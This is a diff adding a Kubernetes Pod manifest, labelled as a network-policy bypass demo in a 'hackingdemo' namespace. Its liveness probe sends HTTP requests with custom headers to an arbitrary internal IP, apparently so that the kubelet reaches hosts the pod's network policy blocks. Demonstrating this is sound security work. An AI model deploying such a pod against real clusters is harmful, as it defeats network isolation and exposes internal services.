@@ -1,0 +1,25 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    hack: netpolbypass
+  name: netpolbypass
+  namespace: hackingdemo
+spec:
+  containers:
+  - name: liveness
+    image: ubuntu
+    args:
+    - /bin/sh
+    - -c
+    - touch /tmp/healthy;sleep 600
+    livenessProbe:
+      httpGet:
+        host: 192.168.45.5
+        path: /app1
+        port: 80
+        httpHeaders:
+          - name: Host
+            value: zone1
+          - name: User-Agent
+            value: xxxxxxx
